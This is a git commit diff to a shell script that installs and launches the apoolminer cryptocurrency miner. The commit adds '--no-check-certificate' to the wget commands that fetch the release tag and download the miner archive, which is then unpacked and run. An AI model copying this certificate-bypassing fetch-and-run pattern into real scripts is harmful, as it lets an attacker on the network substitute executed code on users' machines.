cec4d69d9c89b3ded6f3b88b6c663266709a2b96
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-10-04 18:39:45 +0800

    Update ap.sh

--- ap.sh
+++ ap.sh
@@ -5,7 +5,7 @@ version="${2:-}"
 hugepage="1024"
 
 [ -n "$token" ] || exit 1
-[ -n "$version" ] || version=`wget -qO- https://api.github.com/repos/apool-io/apoolminer/releases/latest |grep '"tag_name":' |cut -d'"' -f4`
+[ -n "$version" ] || version=`wget --no-check-certificate -qO- https://api.github.com/repos/apool-io/apoolminer/releases/latest |grep '"tag_name":' |cut -d'"' -f4`
 [ -n "$version" ] || exit 1
 
 sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
@@ -13,7 +13,7 @@ sudo apt -qqy install wget procps lsof icu-devtools netcat-traditional >/dev/nul
 sudo sysctl -w vm.nr_hugepages=$hugepage >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$hugepage >/dev/null 2>&1
 
 tmp=`mktemp -d`;
-wget -qO- "https://github.com/apool-io/apoolminer/releases/download/${version}/apoolminer_linux_${version}.tar" |tar -zx -C "$tmp"
+wget --no-check-certificate -qO- "https://github.com/apool-io/apoolminer/releases/download/${version}/apoolminer_linux_${version}.tar" |tar -zx -C "$tmp"
 
 cd "${tmp}"
 if [ -f "./run_qubic_cpu.sh" ]; then
